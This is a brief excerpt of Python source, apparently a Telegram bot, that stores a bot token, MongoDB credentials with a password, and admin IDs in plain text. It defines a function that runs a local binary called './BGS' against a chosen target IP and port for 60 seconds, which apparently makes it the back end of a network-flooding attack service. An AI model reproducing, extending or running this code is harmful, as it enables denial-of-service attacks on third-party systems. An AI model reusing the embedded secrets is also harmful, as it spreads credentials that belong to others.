...
TOKEN = '7417601688:AAEFjMjXQVzh54crS1Rz3CdWR05r-SbHjrM'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
CHANNEL_ID = -1002151936458
ADMIN_IDS = [1057829913]
...
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./BGS", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
